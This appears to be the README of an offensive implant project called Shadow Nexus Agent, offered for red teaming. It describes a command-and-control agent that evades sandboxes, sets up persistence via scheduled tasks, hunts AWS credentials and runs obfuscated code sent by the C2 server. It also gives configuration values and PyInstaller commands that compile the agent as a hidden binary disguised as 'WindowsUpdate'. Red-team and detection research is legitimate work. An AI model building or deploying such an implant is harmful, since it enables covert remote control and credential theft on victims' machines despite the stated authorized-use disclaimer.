![Shadow Nexus Agent](../assets/shadow-nexus-agent.png)

# Shadow Nexus Agent

The **Shadow Nexus Agent** is a modular and stealthy endpoint implant designed for advanced red teaming, adversary emulation, and AI-driven threat research.

> ⚠️ **Warning**: This project is intended strictly for **educational purposes** and **authorized security testing** in controlled environments. Running this agent outside of such contexts is strictly prohibited.

---

## 🧠 Mode of Operation

Once deployed, the agent follows this autonomous workflow:

1. **Initial Execution**
   - Starts silently, with no GUI or terminal window.
   - Performs basic evasion checks to avoid execution in sandbox or detection-prone environments.
   - Establishes communication with the C2 server (`/tasks`) and receives predefined instructions.

2. **Default Initial Payloads**
   - **Reconnaissance**: Gathers detailed host and network context, including local users, scheduled tasks, open ports, and live network range mapping via Nmap.
   - **Persistence**: Attempts to register itself as a scheduled task (`schtasks`) or persistent startup method depending on privileges.
   - **Credential Hunt**: Searches for AWS credentials in environment variables and standard config locations (`~/.aws/credentials`).

3. **Task Loop**
   - Periodically contacts the C2 to check for new commands.
   - Executes received Python or PowerShell code (even obfuscated), reports structured results back.
   - Each result can be AI-analyzed by a SOC operator via the dashboard.

4. **Evasion and Deception**
   - Simulates legitimate system activity.
   - Avoids excessive noise and only performs network enumeration if explicitly tasked.

---

## 🔧 Compilation & Configuration


Compilation Steps
Before Compiling:
Edit Configuration Variables in stealth_wrapper.py:

```python
# IMPORTANT: Update these values before compiling
C2_SERVER_URL = "http://your-c2-server:5000"  # Change this to your actual C2 server URL
CHECK_INTERVAL = 45  # Time between C2 checks in seconds
JITTER = 15  # Random jitter added to interval
AGENT_PREFIX = "SHADOW"  # Prefix for agent identification
ENABLE_EVASION = True  # Enable evasion techniques
ENABLE_PERSISTENCE = False  # Keep this FALSE for initial testing
```
Ensure both files are in the same directory:
- advanced_agent.py and stealth_wrapper.py must be in the same folder
- version_info.txt (if using) should also be in this folder
## Compilation Process:
On Windows:
```bash
# Make sure PyInstaller is installed
pip install pyinstaller

# Basic compilation
pyinstaller --onefile --noconsole stealth_wrapper.py

# Enhanced compilation with disguise
pyinstaller --onefile --noconsole --name "WindowsUpdate" --icon "%SystemRoot%\System32\shell32.dll,21" --version-file version_info.txt --clean stealth_wrapper.py
```
On macOS/Linux (for testing):
```bash
# Make sure PyInstaller is installed
pip3 install pyinstaller

# Compile
python3 -m PyInstaller --onefile --noconsole stealth_wrapper.py
```

